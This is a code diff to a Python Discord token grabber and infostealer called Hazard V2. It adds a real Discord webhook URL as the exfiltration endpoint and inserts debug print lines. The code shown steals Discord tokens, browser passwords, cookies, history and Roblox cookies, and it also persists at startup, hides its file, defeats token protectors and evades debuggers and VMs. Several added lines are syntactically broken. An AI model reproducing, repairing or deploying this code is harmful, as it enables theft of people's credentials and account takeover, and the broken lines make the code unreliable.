@@ -28,7 +28,7 @@ __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/998242674081550458/RY8IW3eXO6ENWjOt7nGtAEadXMdyWFMHDQ3mwrhQ8BMECfrgBPqAPFucMWA9ma-Z3LiJ",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
@@ -36,13 +36,15 @@ __config__ = {
     # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
+    'kill_processes': False,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
     'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
+    # enable dev debug lol
+    'dev' : False,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -55,10 +57,10 @@ __config__ = {
 
 }
 # global variables
-Victim = os.getlogin()
-Victim_pc = os.getenv("COMPUTERNAME")
-ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
-disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
+Victim = os.getlogin(); if fetch_conf('dev'): print("Setting up Victim var")
+Victim_pc = os.getenv("COMPUTERNAME") if fetch_conf('dev'): print("Setting up Victim_pc var")
+ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0] if fetch_conf('dev'): print("Setting up ram var")
+disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0] if fetch_conf('dev'): print("Setting up disk var")
 
 
 class Functions(object):
@@ -159,6 +161,7 @@ class Functions(object):
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
+        if fetch_conf('dev'): print("In __init__() func")
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
@@ -183,10 +186,12 @@ class HazardTokenGrabberV2(Functions):
         os.makedirs(self.dir, exist_ok=True)
 
     def hazard_exit(self):
+        if fetch_conf('dev'): print("In hazard_exit() func")
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
     def try_extract(func):
+        if fetch_conf('dev'): print("In try_extract() func")
         '''Decorator to safely catch and ignore exceptions'''
         def wrapper(*args, **kwargs):
             try:
@@ -196,6 +201,7 @@ class HazardTokenGrabberV2(Functions):
         return wrapper
 
     async def checkToken(self, tkn: str) -> str:
+        if fetch_conf('dev'): print("In checkToken() func")
         try:
             r = httpx.get(
                 url=self.discordApi,
@@ -208,6 +214,7 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
+        if fetch_conf('dev'): print("In init() func")
         if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
             self.hazard_exit()
 
@@ -247,15 +254,18 @@ class HazardTokenGrabberV2(Functions):
         self.finish()
 
     def hide(self):
+        if fetch_conf('dev'): print("In hide() func")
         ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
 
     def startup(self):
+        if fetch_conf('dev'): print("In startup() func")
         try:
             shutil.copy2(argv[0], self.startup_loc)
         except Exception:
             pass
 
     async def injector(self):
+        if fetch_conf('dev'): print("In injector() func")
         # TO DO: reduce cognetive complexity
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
@@ -291,6 +301,7 @@ class HazardTokenGrabberV2(Functions):
                                         os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
+        if fetch_conf('dev'): print("In killProcesses() func")
         blackListedPrograms = self.fetch_conf('blackListedPrograms')
         for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
             blackListedPrograms.append(i)
@@ -302,6 +313,7 @@ class HazardTokenGrabberV2(Functions):
                     pass
 
     async def bypassTokenProtector(self):
+        if fetch_conf('dev'): print("In bypassTokenProtector() func")
         # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not ntpath.exists(tp):
@@ -339,6 +351,7 @@ class HazardTokenGrabberV2(Functions):
                 f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
 
     async def bypassBetterDiscord(self):
+        if fetch_conf('dev'): print("In bypassBetterDiscord() func")
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
         if ntpath.exists(bd):
             x = self.hook_reg
@@ -350,6 +363,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grab_tokens(self):
+        if fetch_conf('dev'): print("In grab_tokens() func")
         paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -407,6 +421,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabPassword(self):
+        if fetch_conf('dev'): print("In grabPassword() func")
         f = open(ntpath.join(self.dir, 'Google', 'Google Passwords.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
@@ -433,6 +448,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabCookies(self):
+        if fetch_conf('dev'): print("In grabCookies() func")
         f = open(ntpath.join(self.dir, 'Google', 'Google Cookies.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
@@ -460,6 +476,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabHistory(self):
+        if fetch_conf('dev'): print("In grabHistory() func")
         f = open(ntpath.join(self.dir, 'Google', 'Google History.txt'), 'w', encoding="cp437", errors='ignore')
 
         def extract_search_history(db_cursor):
@@ -497,6 +514,7 @@ class HazardTokenGrabberV2(Functions):
         f.close()
 
     def neatifyTokens(self):
+        if fetch_conf('dev'): print("In neatifyTokens() func")
         f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
             j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
@@ -537,6 +555,7 @@ class HazardTokenGrabberV2(Functions):
         f.close()
 
     def grabMinecraftCache(self):
+        if fetch_conf('dev'): print("In grabMinecraftCache() func")
         minecraft = ntpath.join(self.dir, 'Minecraft')
         os.makedirs(minecraft, exist_ok=True)
         mc = ntpath.join(self.roaming, '.minecraft')
@@ -547,6 +566,7 @@ class HazardTokenGrabberV2(Functions):
                 shutil.copy2(ntpath.join(mc, _file), minecraft + self.sep + _file)
 
     def grabRobloxCookie(self):
+        if fetch_conf('dev'): print("In grabRobloxCookie() func")
         def subproc(path):
             try:
                 return subprocess.check_output(
@@ -565,6 +585,7 @@ class HazardTokenGrabberV2(Functions):
                     f.write(i + '\n')
 
     def screenshot(self):
+        if fetch_conf('dev'): print("In screenshot() func")
         image = ImageGrab.grab(
             bbox=None,
             include_layered_windows=False,
@@ -575,6 +596,7 @@ class HazardTokenGrabberV2(Functions):
         image.close()
 
     def sys_dump(self):
+        if fetch_conf('dev'): print("In sys_dump() func")
         line_sep = "=" * 50
         about = f"""
 {line_sep}
@@ -599,6 +621,7 @@ GoogleMaps: {self.googlemap}
             f.write(about)
 
     def finish(self):
+        if fetch_conf('dev'): print("In finish() func")
         for i in os.listdir(self.dir):
             if i.endswith('.txt'):
                 path = self.dir + self.sep + i
@@ -709,6 +732,7 @@ class AntiDebug(Functions):
     inVM = False
 
     def __init__(self):
+        if fetch_conf('dev'): print("In __init__() func [class AntiDebug]")
         self.processes = list()
 
         self.blackListedUsers = [
@@ -743,9 +767,11 @@ class AntiDebug(Functions):
                 continue
 
     def programExit(self):
+        if fetch_conf('dev'): print("In programExit() func")
         self.__class__.inVM = True
 
     def listCheck(self):
+        if fetch_conf('dev'): print("In listCheck() func")
         for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
             if ntpath.exists(path):
                 self.programExit()
@@ -763,6 +789,7 @@ class AntiDebug(Functions):
                 self.programExit()
 
     def specsCheck(self):
+        if fetch_conf('dev'): print("In specsCheck() func")
         # would not recommend changing this to over 2gb since some actually have 3gb of ram
         if int(ram) <= 2:  # 2gb or less ram
             self.programExit()
@@ -772,6 +799,7 @@ class AntiDebug(Functions):
             self.programExit()
 
     def registryCheck(self):
+        if fetch_conf('dev'): print("In registryCheck() func")
         reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
         reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
         if (reg1 and reg2) != 1:
